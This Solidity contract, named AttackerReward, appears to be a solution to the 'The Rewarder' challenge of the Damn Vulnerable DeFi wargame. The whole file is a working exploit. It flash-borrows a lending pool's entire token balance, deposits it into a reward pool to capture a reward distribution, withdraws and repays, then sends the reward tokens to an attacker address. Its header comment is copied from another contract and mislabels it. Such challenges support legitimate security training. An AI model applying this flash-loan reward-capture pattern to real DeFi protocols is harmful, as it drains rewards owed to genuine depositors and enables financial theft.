// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

// import "./RewardToken.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flashloans of DVT
 */
contract AttackerReward {
    using Address for address;

    FlashLoanerPool public immutable loanPool;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public rewardToken;
    address attacker;

    constructor(
        address liquidityTokenAddress,
        address _rewarderPool,
        address _rewardToken,
        address _loanPoolAddress,
        address player
    ) {
        loanPool = FlashLoanerPool(_loanPoolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewardToken = RewardToken(_rewardToken);
        attacker = player;
    }

    function attack() external {
        uint256 totalBalance = liquidityToken.balanceOf(
            address(loanPool)
        );
        loanPool.flashLoan(totalBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(loanPool), amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
